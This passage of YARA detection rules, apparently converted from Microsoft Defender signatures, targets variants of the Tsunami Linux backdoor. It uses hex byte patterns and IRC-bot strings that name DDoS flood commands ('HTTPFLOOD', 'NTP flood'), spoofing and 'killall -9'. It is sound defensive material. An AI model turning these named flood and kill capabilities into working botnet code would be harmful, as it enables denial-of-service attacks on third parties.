        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {0d c0 a0 e1 ?? ?? 2d e9 ?? ?? 4c e2 ?? ?? 4d e2 14 00 0b e5 18 10 0b e5 14 30 1b e5 00 30 d3 e5 40 30 0b e5 40 30 1b e5 54 00 53 e3 ?? ?? 00 0a 40 30 1b e5 54 00 53 e3 10 00 00 ca 40 30 1b e5 42 00 53 e3 ?? ?? 00 0a 40 30 1b e5 42 00 53 e3 06 00 00 ca 40 30 1b e5 00 00 53 e3 ?? ?? 00 0a 40 30 1b e5 3f 00 53 e3 ?? ?? 00 0a}  //weight: 1, accuracy: Low
        $x_1_2 = {10 00 1b e5 ?? ?? 00 eb 00 30 a0 e1 03 20 a0 e1 10 30 1b e5 03 30 82 e0 ?? ?? 43 e2 00 30 d3 e5 0a 00 53 e3 ?? ?? ff 0a}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Tsunami_DT_2147822839_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Tsunami.DT!MTB"
        threat_id = "2147822839"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Tsunami"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {0d c0 a0 e1 ?? d8 2d e9 ?? b0 4c e2 ?? d0 4d e2 ?? 00 0b e5 ?? 10 0b e5 ?? 30 1b e5 00 30 d3 e5 ?? 30 0b e5 ?? 30 1b e5 54 00 53 e3 ad 00 00 0a ?? 30 1b e5 54 00 53 e3 ?? 00 00 ca ?? 30 1b e5 42 00 53 e3 ?? 00 00 0a ?? 30 1b e5 42 00 53 e3 ?? 00 00 ca ?? 30 1b e5 00 00 53 e3 ?? 00 00 0a ?? 30 1b e5 3f 00 53 e3 ?? 00 00 0a}  //weight: 1, accuracy: Low
        $x_1_2 = {44 30 1b e5 6f 00 53 e3 26 00 00 0a ?? 30 1b e5 74 00 53 e3 ?? 00 00 0a ?? 30 1b e5 62 00 53 e3 ?? 00 00 0a ?? 00 00 ea ?? 30 1b e5}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Tsunami_O_2147828133_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Tsunami.O!xp"
        threat_id = "2147828133"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Tsunami"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "GETSPOOFS" ascii //weight: 1
        $x_1_2 = "HTTPFLOOD" ascii //weight: 1
        $x_1_3 = "%s :Removed all spoofs" ascii //weight: 1
        $x_1_4 = "PRIVMSG %s :Spoofs" ascii //weight: 1
        $x_1_5 = "BeslistBot" ascii //weight: 1
        $x_1_6 = "mxbot/1.0" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (3 of ($x*))
}

rule Backdoor_Linux_Tsunami_H_2147846450_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Tsunami.H!MTB"
        threat_id = "2147846450"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Tsunami"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "bot +udp" ascii //weight: 1
        $x_1_2 = "bot +sudp" ascii //weight: 1
        $x_1_3 = "NTP flood" ascii //weight: 1
        $x_1_4 = "TCP flood" ascii //weight: 1
        $x_1_5 = "killall -9" ascii //weight: 1
        $x_1_6 = "+killsec" ascii //weight: 1
        $x_1_7 = "JOOMLA attack" ascii //weight: 1
        $x_1_8 = "STD attack" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (5 of ($x*))
}

rule Backdoor_Linux_Tsunami_N_2147846766_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Tsunami.N!MTB"
        threat_id = "2147846766"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Tsunami"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {e8 d5 8e ff ff 85 c0 75 27 48 8b 33 48 8b 7d 00 e8 c5 8e ff ff 85 c0 75 17 48 8b 73 10 48 8b 7d 10 e8 b4 8e ff ff 85 c0 75 06 8b 45 08 2b 43 08}  //weight: 1, accuracy: High
        $x_1_2 = {41 8b 7e 18 48 d1 eb 49 8b 36 8b 44 d8 04 85 ff 74 04 0f c8 89 c0 48 01 c6 4c 89 ef e8 a2 8c ff ff 85 c0 78 3e 85 c0 74 64}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Tsunami_DO_2147921852_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Tsunami.DO!MTB"
        threat_id = "2147921852"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Tsunami"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {83 45 ec 01 8b 45 ec 48 63 d8 48 8b 45 e0 48 89 c7 e8 ?? ?? ?? ?? 48 39 c3 73 ?? 8b 45 ec 48 63 d0 48 8b 45 e0 48 01 d0 0f b6 00 3c 20}  //weight: 1, accuracy: Low
        $x_1_2 = {8b 45 cc 48 98 48 c1 e0 04 48 05 40 95 60 00 48 8b 00 ?? ?? ?? ?? ?? ?? ?? 48 89 d6 48 89 c7 e8 ?? ?? ?? ?? 85 c0 75 ?? 8b 45 cc 48 98 48 c1 e0 04 48 05 40 95 60 00 48 8b 40 08 8b 0d 4c 31 20 00 48 8b 55 d0 48 8d b5 10 02 fe ff 89 cf}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

